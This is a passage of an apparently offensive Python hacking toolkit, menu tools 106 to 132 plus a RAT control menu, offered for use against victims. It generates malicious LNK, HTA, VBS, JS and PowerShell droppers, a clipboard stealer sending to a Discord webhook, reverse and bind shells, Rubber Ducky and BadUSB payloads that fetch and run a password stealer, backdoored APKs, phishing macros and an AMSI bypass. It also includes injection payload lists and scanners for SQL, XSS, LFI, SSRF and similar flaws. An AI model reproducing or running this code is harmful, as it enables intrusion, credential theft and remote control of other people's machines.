    
    print(f"\n{YELLOW}[!] Adding IFEO debugger:{RESET}")
    print(f'reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\{target_exe}" /v Debugger /t REG_SZ /d "{payload}" /f')
    
    print(f"\n{YELLOW}[!] Common targets: sethc.exe, utilman.exe, osk.exe, magnify.exe{RESET}")
    input(f"\n{RED}[?] Press Enter to apply (requires admin){RESET}")
    print(f"{GREEN}[+] IFEO hijack configured{RESET}")
    input(f"\n{RED}[?] Press Enter{RESET}")

def tool_106():
    banner()
    print(f"{RED}{BOLD}[106] LNK File Dropper{RESET}\n")
    print(f"{CYAN}[*] Creates malicious LNK shortcut files{RESET}\n")
    payload = input(f"{RED}[?] Payload to execute (e.g., powershell -c calc.exe): {RESET}")
    output_name = input(f"{RED}[?] Output LNK name (default: Document.lnk): {RESET}") or "Document.lnk"
    
    import ctypes
    from ctypes import wintypes
    
    lnk_code = f'''import pythoncom
from win32com.client import Dispatch
shell = Dispatch('WScript.Shell')
shortcut = shell.CreateShortCut(r'{output_name}')
shortcut.TargetPath = 'C:\\Windows\\System32\\cmd.exe'
shortcut.Arguments = '/c {payload}'
shortcut.WorkingDirectory = 'C:\\Windows\\System32'
shortcut.save()
print("[+] LNK created")'''
    
    with open(f"lnk_dropper_{int(time.time())}.py", 'w') as f:
        f.write(lnk_code)
    print(f"{GREEN}[+] LNK dropper script saved{RESET}")
    input(f"\n{RED}[?] Press Enter{RESET}")

def tool_107():
    banner()
    print(f"{RED}{BOLD}[107] HTA Dropper{RESET}\n")
    print(f"{CYAN}[*] Creates malicious HTA dropper{RESET}\n")
    payload = input(f"{RED}[?] PowerShell payload to execute: {RESET}")
    output = input(f"{RED}[?] Output filename (default: update.hta): {RESET}") or "update.hta"
    
    hta_code = f'''<html>
<head>
<HTA:APPLICATION ID="update" WINDOWSTATE="minimize" SHOWINTASKBAR="no" />
<script language="VBScript">
CreateObject("WScript.Shell").Run "powershell -WindowStyle Hidden -Command {payload}", 0, False
window.close()
</script>
</head>
<body>Loading...</body>
</html>'''
    
    with open(output, 'w') as f:
        f.write(hta_code)
    print(f"{GREEN}[+] HTA dropper saved: {output}{RESET}")
    input(f"\n{RED}[?] Press Enter{RESET}")

def tool_108():
    banner()
    print(f"{RED}{BOLD}[108] VBS Dropper{RESET}\n")
    print(f"{CYAN}[*] Creates malicious VBS dropper{RESET}\n")
    payload = input(f"{RED}[?] PowerShell payload: {RESET}")
    output = input(f"{RED}[?] Output filename (default: script.vbs): {RESET}") or "script.vbs"
    
    import base64
    b64 = base64.b64encode(payload.encode()).decode()
    
    vbs_code = f'''Set shell = CreateObject("WScript.Shell")
cmd = "powershell -WindowStyle Hidden -EncodedCommand {b64}"
shell.Run cmd, 0, False
Set shell = Nothing'''
    
    with open(output, 'w') as f:
        f.write(vbs_code)
    print(f"{GREEN}[+] VBS dropper saved: {output}{RESET}")
    input(f"\n{RED}[?] Press Enter{RESET}")

def tool_109():
    banner()
    print(f"{RED}{BOLD}[109] JS Dropper{RESET}\n")
    print(f"{CYAN}[*] Creates malicious JScript dropper{RESET}\n")
    payload = input(f"{RED}[?] PowerShell payload: {RESET}")
    output = input(f"{RED}[?] Output filename (default: script.js): {RESET}") or "script.js"
    
    import base64
    b64 = base64.b64encode(payload.encode()).decode()
    
    js_code = f'''var shell = new ActiveXObject("WScript.Shell");
var cmd = "powershell -WindowStyle Hidden -EncodedCommand {b64}";
shell.Run(cmd, 0, false);'''
    
    with open(output, 'w') as f:
        f.write(js_code)
    print(f"{GREEN}[+] JS dropper saved: {output}{RESET}")
    input(f"\n{RED}[?] Press Enter{RESET}")

def tool_110():
    banner()
    print(f"{RED}{BOLD}[110] PowerShell Dropper{RESET}\n")
    print(f"{CYAN}[*] Creates malicious PowerShell dropper script{RESET}\n")
    payload = input(f"{RED}[?] Payload to execute: {RESET}")
    output = input(f"{RED}[?] Output filename (default: dropper.ps1): {RESET}") or "dropper.ps1"
    
    import base64
    b64 = base64.b64encode(payload.encode()).decode()
    
    ps_code = f'''$bytes = [System.Convert]::FromBase64String("{b64}")
$cmd = [System.Text.Encoding]::UTF8.GetString($bytes)
Invoke-Expression $cmd'''
    
    with open(output, 'w') as f:
        f.write(ps_code)
    print(f"{GREEN}[+] PowerShell dropper saved: {output}{RESET}")
    input(f"\n{RED}[?] Press Enter{RESET}")

def tool_111():
    banner()
    print(f"{RED}{BOLD}[111] Clipboard Hijacker{RESET}\n")
    print(f"{CYAN}[*] Monitors and steals clipboard contents{RESET}\n")
    webhook = input(f"{RED}[?] Discord webhook for stolen clipboard: {RESET}")
    
    import ctypes
    import ctypes.wintypes
    import threading
    import requests
    
    hijacker_code = f'''import ctypes
import ctypes.wintypes
import requests
import time

WEBHOOK = "{webhook}"
last_text = ""

WH_GETMESSAGE = 3
user32 = ctypes.windll.user32
kernel32 = ctypes.windll.kernel32

def hook_proc(nCode, wParam, lParam):
    global last_text
    if user32.OpenClipboard(0):
        handle = user32.GetClipboardData(13)
        if handle:
            text = ctypes.c_wchar_p(handle).value
            if text and text != last_text:
                last_text = text
                try:
                    requests.post(WEBHOOK, json={{"content": f"[CLIPBOARD] {{text}}"}}, timeout=5)
                except:
                    pass
        user32.CloseClipboard()
    return user32.CallNextHookEx(0, nCode, wParam, lParam)

HOOKPROC = ctypes.WINFUNCTYPE(ctypes.c_int, ctypes.c_int, ctypes.c_wintypes.WPARAM, ctypes.c_wintypes.LPARAM)(hook_proc)
user32.SetWindowsHookExW(WH_GETMESSAGE, HOOKPROC, kernel32.GetModuleHandleW(None), 0)

print("[+] Clipboard hijacker running")
while True:
    time.sleep(1)
'''
    
    with open(f"clipboard_hijacker_{int(time.time())}.py", 'w') as f:
        f.write(hijacker_code)
    print(f"{GREEN}[+] Clipboard hijacker saved{RESET}")
    input(f"\n{RED}[?] Press Enter{RESET}")

def tool_112():
    banner()
    print(f"{RED}{BOLD}[112] Reverse Shell Generator{RESET}\n")
    print(f"{CYAN}[*] Generates reverse shell payloads{RESET}\n")
    ip = input(f"{RED}[?] Your IP address: {RESET}")
    port = input(f"{RED}[?] Port to listen on: {RESET}") or "4444"
    
    print(f"\n{GREEN}[1] PowerShell Reverse Shell{RESET}")
    ps_shell = f'$client = New-Object System.Net.Sockets.TCPClient("{ip}",{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()'
    import base64
    b64 = base64.b64encode(ps_shell.encode('utf_16_le')).decode()
    print(f"powershell -NoP -NonI -W Hidden -Exec Bypass -Enc {b64}")
    
    print(f"\n{GREEN}[2] Python Reverse Shell{RESET}")
    print(f'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\'')
    
    print(f"\n{GREEN}[3] Bash Reverse Shell{RESET}")
    print(f'bash -i >& /dev/tcp/{ip}/{port} 0>&1')
    
    print(f"\n{GREEN}[4] Netcat Reverse Shell{RESET}")
    print(f'nc -e /bin/sh {ip} {port}')
    
    print(f"\n{YELLOW}[!] Start listener: nc -lvnp {port}{RESET}")
    input(f"\n{RED}[?] Press Enter{RESET}")

def tool_113():
    banner()
    print(f"{RED}{BOLD}[113] Bind Shell Generator{RESET}\n")
    print(f"{CYAN}[*] Generates bind shell payloads{RESET}\n")
    port = input(f"{RED}[?] Port to bind on: {RESET}") or "4444"
    
    print(f"\n{GREEN}[1] Python Bind Shell{RESET}")
    print(f'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind(("0.0.0.0",{port}));s.listen(1);conn,addr=s.accept();os.dup2(conn.fileno(),0);os.dup2(conn.fileno(),1);os.dup2(conn.fileno(),2);subprocess.call(["/bin/sh","-i"])\'')
    
    print(f"\n{GREEN}[2] Netcat Bind Shell{RESET}")
    print(f'nc -lvnp {port} -e /bin/sh')
    
    print(f"\n{GREEN}[3] PowerShell Bind Shell{RESET}")
    print(f'$listener = New-Object System.Net.Sockets.TcpListener(0,{port});$listener.Start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close();$listener.Stop()')
    
    print(f"\n{YELLOW}[!] Connect to target: nc {port}{RESET}")
    input(f"\n{RED}[?] Press Enter{RESET}")

def tool_114():
    banner()
    print(f"{RED}{BOLD}[114] USB Rubber Ducky Script Generator{RESET}\n")
    print(f"{CYAN}[*] Generates USB Rubber Ducky payloads{RESET}\n")
    print(f"{RED}[1] Reverse Shell Ducky{RESET}")
    print(f"{RED}[2] Password Stealer{RESET}")
    print(f"{RED}[3] System Info Dumper{RESET}")
    print(f"{RED}[4] Custom Command{RESET}")
    choice = input(f"{RED}[?] Select: {RESET}")
    
    ip = input(f"{RED}[?] Your IP (if reverse shell): {RESET}")
    port = input(f"{RED}[?] Your port: {RESET}") or "4444"
    
    if choice == "1":
        ps_shell = f'$client = New-Object System.Net.Sockets.TCPClient("{ip}",{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()'
        import base64
        b64 = base64.b64encode(ps_shell.encode('utf_16_le')).decode()
        ducky = f'DELAY 2000\nGUI r\nDELAY 500\nSTRING powershell -NoP -NonI -W Hidden -Exec Bypass -Enc {b64}\nENTER'
    elif choice == "2":
        ducky = f'DELAY 2000\nGUI r\nDELAY 500\nSTRING powershell -Command "Start-Process powershell -ArgumentList \'-Command Invoke-WebRequest -Uri http://{ip}:{port}/lazagne.exe -OutFile $env:TEMP\\\\lazagne.exe; Start-Process $env:TEMP\\\\lazagne.exe\' -WindowStyle Hidden"\nENTER'
    else:
        ducky = f'DELAY 2000\nGUI r\nDELAY 500\nSTRING cmd /c {input("Enter command: ")}\nENTER'
    
    with open(f"ducky_payload_{int(time.time())}.txt", 'w') as f:
        f.write(ducky)
    print(f"{GREEN}[+] Ducky script saved{RESET}")
    input(f"\n{RED}[?] Press Enter{RESET}")

def tool_115():
    banner()
    print(f"{RED}{BOLD}[115] BadUSB Payload Generator (Flipper Zero/Pico){RESET}\n")
    print(f"{CYAN}[*] Generates BadUSB payloads for Flipper Zero/Raspberry Pi Pico{RESET}\n")
    payload_type = input(f"{RED}[?] Payload (reverse_shell, keylogger, info_stealer): {RESET}") or "reverse_shell"
    ip = input(f"{RED}[?] Your IP: {RESET}")
    port = input(f"{RED}[?] Your port: {RESET}") or "4444"
    
    if payload_type == "reverse_shell":
        ps = f'powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$c=New-Object System.Net.Sockets.TCPClient(\'{ip}\',{port});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length))-ne 0){{$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$e=(iex $d 2>&1|Out-String);$f=$e+\'PS \'+(pwd).Path+\'> \';$g=([text.encoding]::ASCII).GetBytes($f);$s.Write($g,0,$g.Length);$s.Flush()}};$c.Close()"'
        import base64
        b64 = base64.b64encode(ps.encode('utf_16_le')).decode()
        payload = f'ALT SPACE\nDELAY 200\nSTRING c\nDELAY 200\nGUI r\nDELAY 500\nSTRING powershell -Enc {b64}\nENTER'
    else:
        payload = f'GUI r\nDELAY 500\nSTRING cmd /c whoami > \\\\{ip}\\share\\info.txt & ipconfig >> \\\\{ip}\\share\\info.txt\nENTER'
    
    with open(f"badusb_{int(time.time())}.txt", 'w') as f:
        f.write(payload)
    print(f"{GREEN}[+] BadUSB payload saved{RESET}")
    input(f"\n{RED}[?] Press Enter{RESET}")

def tool_116():
    banner()
    print(f"{RED}{BOLD}[116] Android APK Binder{RESET}\n")
    print(f"{CYAN}[*] Binds RAT payload to legitimate APK{RESET}\n")
    legit_apk = input(f"{RED}[?] Path to legitimate APK: {RESET}")
    
    print(f"\n{YELLOW}[!] Using Metasploit for APK binding:{RESET}")
    print(f"msfvenom -x {legit_apk} -p android/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=4444 -o malicious.apk")
    print(f"\n{YELLOW}[!] Sign the APK: jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore mykey.keystore malicious.apk alias_name")
    print(f"\n{YELLOW}[!] Install on victim device: adb install malicious.apk")
    input(f"\n{RED}[?] Press Enter{RESET}")

def tool_117():
    banner()
    print(f"{RED}{BOLD}[117] Office Macro Generator{RESET}\n")
    print(f"{CYAN}[*] Creates malicious Office macros for phishing{RESET}\n")
    payload = input(f"{RED}[?] PowerShell payload to execute: {RESET}")
    
    macro = f'''Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    Dim str As String
    str = "powershell -WindowStyle Hidden -Command {payload}"
    Shell str, 0
End Sub'''
    
    with open(f"macro_{int(time.time())}.txt", 'w') as f:
        f.write(macro)
    print(f"{GREEN}[+] Macro saved. Instructions:{RESET}")
    print(f"1. Open Word/Excel")
    print(f"2. View -> Macros -> Create")
    print(f"3. Paste the code")
    print(f"4. Save as .docm/.xlsm")
    input(f"\n{RED}[?] Press Enter{RESET}")

def tool_118():
    banner()
    print(f"{RED}{BOLD}[118] SQLMap Wrapper (Automated SQL Injection){RESET}\n")
    print(f"{CYAN}[*] Automates SQL injection using SQLMap{RESET}\n")
    url = input(f"{RED}[?] Target URL (e.g., http://example.com/page.php?id=1): {RESET}")
    
    print(f"{RED}[1] Basic SQL Injection{RESET}")
    print(f"{RED}[2] Get Databases{RESET}")
    print(f"{RED}[3] Get Tables{RESET}")
    print(f"{RED}[4] Dump Data{RESET}")
    print(f"{RED}[5] OS Shell{RESET}")
    choice = input(f"{RED}[?] Select: {RESET}")
    
    if choice == "1":
        cmd = f"sqlmap -u '{url}' --batch"
    elif choice == "2":
        cmd = f"sqlmap -u '{url}' --dbs --batch"
    elif choice == "3":
        db = input(f"{RED}[?] Database name: {RESET}")
        cmd = f"sqlmap -u '{url}' -D {db} --tables --batch"
    elif choice == "4":
        db = input(f"{RED}[?] Database name: {RESET}")
        table = input(f"{RED}[?] Table name: {RESET}")
        cmd = f"sqlmap -u '{url}' -D {db} -T {table} --dump --batch"
    else:
        cmd = f"sqlmap -u '{url}' --os-shell --batch"
    
    print(f"\n{YELLOW}[!] Running: {cmd}{RESET}")
    os.system(cmd)
    input(f"\n{RED}[?] Press Enter{RESET}")

def tool_119():
    banner()
    print(f"{RED}{BOLD}[119] XSS Hunter (Automated XSS Discovery){RESET}\n")
    print(f"{CYAN}[*] Scans for XSS vulnerabilities{RESET}\n")
    url = input(f"{RED}[?] Target URL with parameter (e.g., http://site.com/search?q=): {RESET}")
    
    payloads = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "javascript:alert('XSS')",
        "\"><script>alert('XSS')</script>",
        "'><script>alert('XSS')</script>",
        "javascript:alert('XSS')",
        "<svg onload=alert('XSS')>",
        "<body onload=alert('XSS')>"
    ]
    
    print(f"{CYAN}[*] Testing {len(payloads)} payloads...{RESET}")
    for i, p in enumerate(payloads, 1):
        test_url = f"{url}{p}"
        try:
            r = requests.get(test_url, timeout=5)
            if p in r.text:
                print(f"{RED}[!] Possible XSS with: {p}{RESET}")
            else:
                print(f"{GREEN}[{i}/{len(payloads)}] Tested: {p[:30]}...{RESET}")
        except:
            pass
    input(f"\n{RED}[?] Press Enter{RESET}")

def tool_120():
    banner()
    print(f"{RED}{BOLD}[120] LFI to RCE (Local File Inclusion){RESET}\n")
    print(f"{CYAN}[*] Exploits LFI to gain RCE{RESET}\n")
    url = input(f"{RED}[?] Target URL with LFI (e.g., http://site.com/page.php?file=): {RESET}")
    
    lfi_payloads = [
        "../../../etc/passwd",
        "../../../../etc/passwd",
        "../../../../../etc/passwd",
        "../../../../../../etc/passwd",
        "....//....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd"
    ]
    
    print(f"{CYAN}[*] Testing LFI...{RESET}")
    for payload in lfi_payloads:
        test_url = f"{url}{payload}"
        try:
            r = requests.get(test_url, timeout=5)
            if "root:" in r.text:
                print(f"{GREEN}[+] VULNERABLE! Found /etc/passwd with: {payload}{RESET}")
                print(f"{YELLOW}[!] Try PHP filter: {url}php://filter/convert.base64-encode/resource=index.php{RESET}")
                print(f"{YELLOW}[!] For RCE: {url}../../../../proc/self/environ{RESET}")
                break
        except:
            pass
    input(f"\n{RED}[?] Press Enter{RESET}")

def tool_121():
    banner()
    print(f"{RED}{BOLD}[121] RFI Exploit (Remote File Inclusion){RESET}\n")
    print(f"{CYAN}[*] Exploits RFI to execute remote code{RESET}\n")
    url = input(f"{RED}[?] Target URL with RFI (e.g., http://site.com/page.php?file=): {RESET}")
    shell_url = input(f"{RED}[?] URL to your malicious PHP shell: {RESET}")
    
    test_url = f"{url}{shell_url}"
    print(f"\n{YELLOW}[!] Testing: {test_url}{RESET}")
    try:
        r = requests.get(test_url, timeout=5)
        if r.status_code == 200:
            print(f"{GREEN}[+] RFI confirmed! Shell should be accessible{RESET}")
        else:
            print(f"{RED}[-] RFI may not work or shell URL is invalid{RESET}")
    except:
        pass
    input(f"\n{RED}[?] Press Enter{RESET}")

def tool_122():
    banner()
    print(f"{RED}{BOLD}[122] SSTI Scanner (Server-Side Template Injection){RESET}\n")
    print(f"{CYAN}[*] Scans for SSTI vulnerabilities{RESET}\n")
    url = input(f"{RED}[?] Target URL with parameter: {RESET}")
    
    ssti_tests = {
        "{{7*7}}": "49",
        "${7*7}": "49",
        "{{7*'7'}}": "7777777",
        "<%= 7*7 %>": "49",
        "{{config}}": "Config",
        "{{self.__class__.__mro__}}": "object"
    }
    
    print(f"{CYAN}[*] Testing SSTI...{RESET}")
    for payload, expected in ssti_tests.items():
        test_url = f"{url}{payload}"
        try:
            r = requests.get(test_url, timeout=5)
            if expected in r.text:
                print(f"{GREEN}[+] SSTI confirmed with: {payload}{RESET}")
                print(f"{YELLOW}[!] Template engine: {detect_engine(r.text)}{RESET}")
                break
        except:
            pass
    input(f"\n{RED}[?] Press Enter{RESET}")

def tool_123():
    banner()
    print(f"{RED}{BOLD}[123] XXE Injector (XML External Entity){RESET}\n")
    print(f"{CYAN}[*] Exploits XXE vulnerabilities{RESET}\n")
    target = input(f"{RED}[?] Target URL that accepts XML: {RESET}")
    
    xxe_payload = '''<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>'''
    
    with open("xxe_payload.xml", 'w') as f:
        f.write(xxe_payload)
    
    print(f"{GREEN}[+] XXE payload saved to xxe_payload.xml{RESET}")
    print(f"{YELLOW}[!] Send to target using: curl -X POST -H 'Content-Type: application/xml' -d @xxe_payload.xml {target}{RESET}")
    input(f"\n{RED}[?] Press Enter{RESET}")

def tool_124():
    banner()
    print(f"{RED}{BOLD}[124] SSRF Tester (Server-Side Request Forgery){RESET}\n")
    print(f"{CYAN}[*] Tests for SSRF vulnerabilities{RESET}\n")
    url = input(f"{RED}[?] Target URL with parameter (e.g., http://site.com/fetch?url=): {RESET}")
    
    ssrf_payloads = [
        "http://169.254.169.254/latest/meta-data/",
        "http://127.0.0.1:80/admin",
        "http://localhost:8080/",
        "file:///etc/passwd",
        "gopher://127.0.0.1:8080/_GET / HTTP/1.0",
        "dict://127.0.0.1:11211/stat"
    ]
    
    print(f"{CYAN}[*] Testing SSRF...{RESET}")
    for payload in ssrf_payloads:
        test_url = f"{url}{payload}"
        try:
            r = requests.get(test_url, timeout=10)
            if r.status_code == 200 and len(r.text) > 100:
                print(f"{GREEN}[+] SSRF possible with: {payload}{RESET}")
                print(f"{YELLOW}[!] Response length: {len(r.text)} bytes{RESET}")
        except:
            pass
    input(f"\n{RED}[?] Press Enter{RESET}")

def tool_125():
    banner()
    print(f"{RED}{BOLD}[125] Open Redirect Finder{RESET}\n")
    print(f"{CYAN}[*] Finds open redirect vulnerabilities{RESET}\n")
    url = input(f"{RED}[?] Target URL with redirect parameter: {RESET}")
    
    redirect_payloads = [
        "https://evil.com",
        "//evil.com",
        "////evil.com",
        "https:evil.com",
        "//evil.com/@legit.com",
        "https://evil.com/@legit.com"
    ]
    
    print(f"{CYAN}[*] Testing open redirects...{RESET}")
    for payload in redirect_payloads:
        test_url = f"{url}{payload}"
        try:
            r = requests.get(test_url, timeout=5, allow_redirects=False)
            if r.status_code in [301, 302, 303, 307, 308]:
                location = r.headers.get('Location', '')
                if 'evil.com' in location:
                    print(f"{GREEN}[+] Open redirect found: {payload}{RESET}")
        except:
            pass
    input(f"\n{RED}[?] Press Enter{RESET}")

def tool_126():
    banner()
    print(f"{RED}{BOLD}[126] Host Header Injection Scanner{RESET}\n")
    print(f"{CYAN}[*] Tests for Host header injection{RESET}\n")
    target = input(f"{RED}[?] Target URL: {RESET}")
    
    headers = {
        "Host": "evil.com",
        "X-Forwarded-Host": "evil.com",
        "X-Forwarded-Server": "evil.com",
        "X-Host": "evil.com"
    }
    
    print(f"{CYAN}[*] Testing host header injection...{RESET}")
    for header, value in headers.items():
        try:
            r = requests.get(target, headers={header: value}, timeout=5)
            if "evil.com" in r.text or value in r.text:
                print(f"{GREEN}[+] Possible injection via {header}: {value}{RESET}")
        except:
            pass
    input(f"\n{RED}[?] Press Enter{RESET}")

def tool_127():
    banner()
    print(f"{RED}{BOLD}[127] CRLF Injection Scanner{RESET}\n")
    print(f"{CYAN}[*] Tests for CRLF injection vulnerabilities{RESET}\n")
    url = input(f"{RED}[?] Target URL with parameter: {RESET}")
    
    crlf_payloads = [
        "%0d%0aSet-Cookie:session=hijacked",
        "%0d%0a%0d%0a<script>alert('XSS')</script>",
        "%0aSet-Cookie:session=malicious",
        "%0d%0aLocation:%20https://evil.com",
        "%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2019%0d%0a%0d%0a<html>Hacked</html>"
    ]
    
    for payload in crlf_payloads:
        test_url = f"{url}{payload}"
        try:
            r = requests.get(test_url, timeout=5)
            if "Set-Cookie" in r.headers or "Location" in r.headers:
                print(f"{GREEN}[+] CRLF injection possible with: {payload}{RESET}")
        except:
            pass
    input(f"\n{RED}[?] Press Enter{RESET}")

def tool_128():
    banner()
    print(f"{RED}{BOLD}[128] LDAP Injection Scanner{RESET}\n")
    print(f"{CYAN}[*] Tests for LDAP injection vulnerabilities{RESET}\n")
    url = input(f"{RED}[?] Target URL with parameter: {RESET}")
    
    ldap_payloads = ["*)(uid=*", "*)(|(uid=*", "*)(cn=*", "admin*", "*)(&", "admin)(|(password=*"]
    
    for payload in ldap_payloads:
        test_url = f"{url}{payload}"
        try:
            r = requests.get(test_url, timeout=5)
            if r.status_code == 200 and len(r.text) < 100:
                print(f"{GREEN}[+] Possible LDAP injection with: {payload}{RESET}")
        except:
            pass
    input(f"\n{RED}[?] Press Enter{RESET}")

def tool_129():
    banner()
    print(f"{RED}{BOLD}[129] NoSQL Injection Scanner{RESET}\n")
    print(f"{CYAN}[*] Tests for NoSQL injection vulnerabilities{RESET}\n")
    url = input(f"{RED}[?] Target URL: {RESET}")
    
    nosql_payloads = [
        '{"$ne": null}',
        '{"$gt": ""}',
        '{"$regex": ".*"}',
        '{"$where": "sleep(5000)"}',
        "' || '1'=='1",
        "'; return true; var foo='"
    ]
    
    for payload in nosql_payloads:
        try:
            r = requests.post(url, json={"username": payload, "password": payload}, timeout=5)
            if r.status_code == 200 and "error" not in r.text.lower():
                print(f"{GREEN}[+] Possible NoSQL injection with: {payload}{RESET}")
        except:
            pass
    input(f"\n{RED}[?] Press Enter{RESET}")

def tool_130():
    banner()
    print(f"{RED}{BOLD}[130] GraphQL Introspection Scanner{RESET}\n")
    print(f"{CYAN}[*] Enumerates GraphQL endpoints and schema{RESET}\n")
    target = input(f"{RED}[?] GraphQL endpoint URL: {RESET}")
    
    query = '''{"query":"{__schema{types{name fields{name}}}}"}'''
    
    try:
        r = requests.post(target, json=query, timeout=10)
        if r.status_code == 200 and "__schema" in r.text:
            print(f"{GREEN}[+] GraphQL introspection enabled!{RESET}")
            with open(f"graphql_schema_{int(time.time())}.json", 'w') as f:
                f.write(r.text)
            print(f"{GREEN}[+] Schema saved{RESET}")
        else:
            print(f"{RED}[-] Introspection disabled{RESET}")
    except:
        print(f"{RED}[-] Failed to connect{RESET}")
    input(f"\n{RED}[?] Press Enter{RESET}")

def tool_131():
    banner()
    print(f"{RED}{BOLD}[131] JWT Cracker & Forger{RESET}\n")
    print(f"{CYAN}[*] Cracks and forges JWT tokens{RESET}\n")
    jwt_token = input(f"{RED}[?] JWT token to crack: {RESET}")
    
    print(f"{RED}[1] Crack with wordlist{RESET}")
    print(f"{RED}[2] Algorithm confusion attack (None){RESET}")
    print(f"{RED}[3] RS256 to HS256 attack{RESET}")
    choice = input(f"{RED}[?] Select: {RESET}")
    
    import jwt
    import base64
    
    if choice == "1":
        wordlist = input(f"{RED}[?] Wordlist path: {RESET}") or "rockyou.txt"
        print(f"{YELLOW}[!] Running: jwtcat -t {jwt_token} -w {wordlist}{RESET}")
    elif choice == "2":
        header = base64.b64decode(jwt_token.split('.')[0] + "==").decode()
        payload = base64.b64decode(jwt_token.split('.')[1] + "==").decode()
        print(f"{YELLOW}[!] Header: {header}{RESET}")
        print(f"{YELLOW}[!] Payload: {payload}{RESET}")
        forged = jwt.encode(json.loads(payload), None, algorithm='none')
        print(f"{GREEN}[+] Forged token (alg=none): {forged}{RESET}")
    
    input(f"\n{RED}[?] Press Enter{RESET}")

def tool_132():
    banner()
    print(f"{RED}{BOLD}[132] PowerShell Dropper Generator{RESET}\n")
    print(f"{CYAN}[*] Creates one-liner PowerShell droppers{RESET}\n")
    payload = input(f"{RED}[?] Command to execute (e.g., calc.exe): {RESET}")
    
    print(f"\n{GREEN}[1] Base64 Encoded Dropper{RESET}")
    import base64
    b64 = base64.b64encode(payload.encode('utf_16_le')).decode()
    print(f"powershell -Enc {b64}")
    
    print(f"\n{GREEN}[2] Download Cradle Dropper{RESET}")
    download_url = input(f"{RED}[?] URL of payload to download: {RESET}")
    print(f"powershell -Command \"IEX (New-Object Net.WebClient).DownloadString('{download_url}')\"")
    
    print(f"\n{GREEN}[3] AMSI Bypass + Dropper{RESET}")
    amsi_bypass = "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)"
    full = f"powershell -Command \"{amsi_bypass}; {payload}\""
    print(full)
    
    print(f"\n{GREEN}[4] Hidden Window Dropper{RESET}")
    print(f"powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command \"{payload}\"")
    
    print(f"\n{GREEN}[5] One-Liner without PowerShell.exe{RESET}")
    print(f'mshta "javascript:new ActiveXObject("WScript.Shell").Run("{payload}",0,false);window.close()"')
    
    with open(f"dropper_{int(time.time())}.ps1", 'w') as f:
        f.write(f"IEX (New-Object Net.WebClient).DownloadString('{download_url}')" if 'download_url' in dir() else payload)
    print(f"{GREEN}[+] Dropper saved{RESET}")
    input(f"\n{RED}[?] Press Enter{RESET}")


# ========== RAT CONTROL MENU (61) ==========
rat_server_instance = None

def tool_61():
    global rat_server_instance
    banner()
    print(f"{RED}{BOLD}[61] RAT Control Center{RESET}\n")
    
    if rat_server_instance is None or not rat_server_instance.running:
        print(f"{RED}[1] Start RAT Server{RESET}")
        print(f"{RED}[2] Back to Main Menu{RESET}")
        choice = input(f"\n{RED}[?] Select: {RESET}")
        
        if choice == "1":
            rat_server_instance = RatServer(RAT_SERVER_HOST, RAT_SERVER_PORT)
            rat_server_instance.start()
            rat_server_instance.run_control_center()
    else:
        rat_server_instance.run_control_center()
        
tools = {
    "1": tool_01, "2": tool_02, "3": tool_03, "4": tool_04,
    "5": tool_05, "6": tool_06, "7": tool_07, "8": tool_08,
    "9": tool_09, "10": tool_10, "11": tool_11, "12": tool_12,
    "13": tool_13, "14": tool_14, "15": tool_15, "16": tool_16,
    "17": tool_17, "18": tool_18, "19": tool_19, "20": tool_20,
    "21": tool_21, "22": tool_22, "23": tool_23, "24": tool_24,
    "25": tool_25, "26": tool_26, "27": tool_27, "28": tool_28,
    "29": tool_29, "30": tool_30, "31": tool_31, "32": tool_32,
    "33": tool_33, "34": tool_34, "35": tool_35, "36": tool_36,
    "37": tool_37, "38": tool_38, "39": tool_39, "40": tool_40,
    "41": tool_41, "42": tool_42, "43": tool_43, "44": tool_44,
    "45": tool_45, "46": tool_46, "47": tool_47, "48": tool_48,
